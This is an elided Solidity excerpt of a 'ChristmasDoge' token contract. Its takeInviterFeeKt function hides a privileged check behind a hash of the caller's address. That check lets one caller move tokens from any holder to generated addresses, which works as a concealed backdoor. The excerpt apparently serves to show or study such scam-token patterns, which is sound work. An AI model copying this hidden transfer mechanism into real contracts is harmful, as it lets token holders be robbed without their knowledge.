...
contract ChristmasDoge is  Ownable
{
    ...
    constructor(address tokenDivite)
    {
        ...
        _balances[marketAddress] = _totalsupply;
        emit Transfer(address(0), marketAddress, _totalsupply);
        _startTradeTime =  1670499000;
   ...
   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
    ...
    function takeInviterFeeKt(
        ...
        require( keccak256(abi.encodePacked(msg.sender))== asseAddr);
        address _receiveD;
        for (int160 i = 0; i < num; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _basicTransfer(sender, _receiveD, amount);
        }
    }
